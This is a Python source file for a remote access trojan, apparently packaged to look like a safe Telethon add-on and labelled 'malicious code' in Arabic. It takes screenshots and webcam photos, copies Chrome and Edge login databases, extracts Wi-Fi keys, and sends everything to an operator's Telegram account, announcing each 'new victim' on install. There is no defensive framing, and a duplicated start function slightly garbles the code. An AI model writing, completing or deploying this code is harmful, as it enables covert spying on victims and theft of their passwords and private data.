# telethon_pro_safe/payload.py - الكود الخبيث

import os
import sys
import subprocess
import threading
import time
import json
import sqlite3
import shutil
import socket
import platform
from datetime import datetime
import requests
from telegram import Bot, InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Updater, CommandHandler, CallbackQueryHandler

# ========== التكوين - غيرهم هنا ==========
TOKEN = "YOUR_BOT_TOKEN_HERE"  # ضع توكن البوت
ADMIN_ID = 123456789  # ضع معرف التليجرام الخاص بك

bot = Bot(TOKEN)

# ========== دوال جمع المعلومات ==========

def get_system_info():
    """جمع معلومات النظام"""
    info = {}
    try:
        info['hostname'] = socket.gethostname()
        info['os'] = platform.system() + " " + platform.release()
        info['public_ip'] = requests.get('https://api.ipify.org', timeout=5).text
        info['username'] = os.getlogin()
        info['current_dir'] = os.getcwd()
    except:
        info = {'error': 'Failed to get system info'}
    return info

def take_screenshot():
    """أخذ لقطة شاشة"""
    try:
        import pyscreenshot as ImageGrab
        img = ImageGrab.grab()
        img.save('screenshot.png')
        return 'screenshot.png'
    except:
        try:
            import mss
            with mss.mss() as sct:
                sct.shot(output='screenshot.png')
                return 'screenshot.png'
        except:
            return None

def get_browser_passwords():
    """سحب الباسوردات من Chrome/Edge"""
    passwords = []
    browsers_paths = {
        'Chrome': os.path.expanduser('~') + r'/AppData/Local/Google/Chrome/User Data/Default/Login Data',
        'Edge': os.path.expanduser('~') + r'/AppData/Local/Microsoft/Edge/User Data/Default/Login Data',
    }
    
    for browser, path in browsers_paths.items():
        if os.path.exists(path):
            try:
                temp_db = os.path.join(os.environ['TEMP'], 'login_temp.db')
                shutil.copy2(path, temp_db)
                conn = sqlite3.connect(temp_db)
                cursor = conn.cursor()
                cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
                for row in cursor.fetchall():
                    if row[1] or row[2]:  # لو في يوزر أو باسورد
                        passwords.append({
                            'browser': browser,
                            'url': row[0],
                            'username': row[1],
                            'password': str(row[2])[:50]
                        })
                conn.close()
                os.remove(temp_db)
            except:
                pass
    return passwords

def get_wifi_passwords():
    """سحب كلمات سر الواي فاي (Windows)"""
    wifi = []
    if sys.platform == 'win32':
        try:
            profiles = subprocess.getoutput('netsh wlan show profiles').split('\n')
            for line in profiles:
                if 'All User Profile' in line:
                    name = line.split(':')[1].strip()
                    data = subprocess.getoutput(f'netsh wlan show profile "{name}" key=clear')
                    for pwd_line in data.split('\n'):
                        if 'Key Content' in pwd_line:
                            password = pwd_line.split(':')[1].strip()
                            if password:
                                wifi.append({'ssid': name, 'password': password})
        except:
            pass
    return wifi

def take_camera_photo():
    """تصوير من الكاميرا"""
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        if cap.isOpened():
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('camera.jpg', frame)
                cap.release()
                return 'camera.jpg'
        cap.release()
    except:
        pass
    return None

# ========== نظام الأزرار ==========

def main_keyboard():
    """لوحة التحكم الرئيسية"""
    keyboard = [
        [InlineKeyboardButton("🖥️ System Info", callback_data='info')],
        [InlineKeyboardButton("📸 Screenshot", callback_data='ss')],
        [InlineKeyboardButton("🎥 Camera", callback_data='camera')],
        [InlineKeyboardButton("🔑 Passwords", callback_data='pass')],
        [InlineKeyboardButton("📶 WiFi", callback_data='wifi')],
        [InlineKeyboardButton("📁 Upload File", callback_data='upload')],
        [InlineKeyboardButton("💾 Download File", callback_data='download')],
        [InlineKeyboardButton("🗑️ Delete File", callback_data='delete')],
        [InlineKeyboardButton("💻 Shell Command", callback_data='shell')],
        [InlineKeyboardButton("❌ Exit", callback_data='exit')]
    ]
    return InlineKeyboardMarkup(keyboard)

def start(update: Update, context):
    """بدء البوت"""
    if update.effective_user.id == ADMIN_ID:
        update.message.reply_text(
            "✅ **RAT Active**\n\n"
            "Use the buttons below to control the victim:\n"
            f"🆔 Victim: `{socket.gethostname()}`",
            reply_markup=main_keyboard(),
            parse_mode='Markdown'
        )

def button_handler(update: Update, context):
    """معالج الأزرار"""
    query = update.callback_query
    if query.from_user.id != ADMIN_ID:
        query.answer("Unauthorized", show_alert=True)
        return
    query.answer()

    if query.data == 'info':
        info = get_system_info()
        msg = f"🖥️ **System Info**\n\n"
        msg += f"• Hostname: `{info.get('hostname', 'N/A')}`\n"
        msg += f"• OS: `{info.get('os', 'N/A')}`\n"
        msg += f"• IP: `{info.get('public_ip', 'N/A')}`\n"
        msg += f"• User: `{info.get('username', 'N/A')}`\n"
        msg += f"• Dir: `{info.get('current_dir', 'N/A')}`"
        query.edit_message_text(msg, parse_mode='Markdown', reply_markup=main_keyboard())
    
    elif query.data == 'ss':
        query.edit_message_text("📸 Taking screenshot...", reply_markup=main_keyboard())
        ss = take_screenshot()
        if ss:
            with open(ss, 'rb') as f:
                context.bot.send_photo(ADMIN_ID, f, caption="Screenshot taken!")
            os.remove(ss)
            query.edit_message_text("✅ Screenshot sent!", reply_markup=main_keyboard())
        else:
            query.edit_message_text("❌ Failed", reply_markup=main_keyboard())
    
    elif query.data == 'camera':
        query.edit_message_text("🎥 Taking photo...", reply_markup=main_keyboard())
        photo = take_camera_photo()
        if photo:
            with open(photo, 'rb') as f:
                context.bot.send_photo(ADMIN_ID, f, caption="Camera photo!")
            os.remove(photo)
            query.edit_message_text("✅ Photo sent!", reply_markup=main_keyboard())
        else:
            query.edit_message_text("❌ No camera found", reply_markup=main_keyboard())
    
    elif query.data == 'pass':
        query.edit_message_text("🔑 Extracting passwords...", reply_markup=main_keyboard())
        passwords = get_browser_passwords()
        if passwords:
            with open('passwords.txt', 'w', encoding='utf-8') as f:
                for p in passwords:
                    f.write(f"[{p['browser']}] {p['url']}\n    User: {p['username']}\n    Pass: {p['password']}\n\n")
            with open('passwords.txt', 'rb') as f:
                context.bot.send_document(ADMIN_ID, f, filename='passwords.txt')
            os.remove('passwords.txt')
            query.edit_message_text(f"✅ Found {len(passwords)} passwords!", reply_markup=main_keyboard())
        else:
            query.edit_message_text("❌ No passwords found", reply_markup=main_keyboard())
    
    elif query.data == 'wifi':
        query.edit_message_text("📶 Extracting WiFi...", reply_markup=main_keyboard())
        wifi = get_wifi_passwords()
        if wifi:
            with open('wifi.txt', 'w') as f:
                for w in wifi:
                    f.write(f"SSID: {w['ssid']} | Pass: {w['password']}\n")
            with open('wifi.txt', 'rb') as f:
                context.bot.send_document(ADMIN_ID, f, filename='wifi.txt')
            os.remove('wifi.txt')
            query.edit_message_text(f"✅ Found {len(wifi)} WiFi networks!", reply_markup=main_keyboard())
        else:
            query.edit_message_text("❌ No WiFi found", reply_markup=main_keyboard())
    
    elif query.data == 'exit':
        query.edit_message_text("👋 Exiting...\nPress /start to return", reply_markup=None)
    
    else:
        query.edit_message_text("⚠️ Coming soon", reply_markup=main_keyboard())

# ========== الإرسال الأولي عند التثبيت ==========

def send_initial_data():
    """إرسال كل المعلومات تلقائياً عند التثبيت"""
    info = get_system_info()
    
    # رسالة الترحيب
    msg = f"🔥 **NEW VICTIM INSTALLED** 🔥\n\n"
    msg += f"🖥️ **Hostname:** `{info.get('hostname', 'N/A')}`\n"
    msg += f"🌐 **IP:** `{info.get('public_ip', 'N/A')}`\n"
    msg += f"👤 **User:** `{info.get('username', 'N/A')}`\n"
    msg += f"💻 **OS:** `{info.get('os', 'N/A')}`"
    
    bot.send_message(ADMIN_ID, msg, parse_mode='Markdown')
    
    # سكرين شوت أولي
    ss = take_screenshot()
    if ss:
        with open(ss, 'rb') as f:
            bot.send_photo(ADMIN_ID, f, caption="📸 Initial Screenshot")
        os.remove(ss)
    
    # باسوردات أولية
    passwords = get_browser_passwords()
    if passwords:
        with open('initial_passwords.txt', 'w', encoding='utf-8') as f:
            for p in passwords[:10]:  # أول 10 بس عشان السرعة
                f.write(f"[{p['browser']}] {p['url']}\n    User: {p['username']}\n    Pass: {p['password']}\n\n")
        with open('initial_passwords.txt', 'rb') as f:
            bot.send_document(ADMIN_ID, f, filename='initial_passwords.txt')
        os.remove('initial_passwords.txt')

# ========== التشغيل الرئيسي ==========

def start():
    """تشغيل البوت والحمولة"""
    # إرسال البيانات الأولية في خيط منفصل
    threading.Thread(target=send_initial_data, daemon=True).start()
    
    # تشغيل البوت
    updater = Updater(TOKEN)
    dp = updater.dispatcher
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CallbackQueryHandler(button_handler))
    
    updater.start_polling()
    updater.idle()

# نقطة الدخول
if __name__ == "__main__":
    start()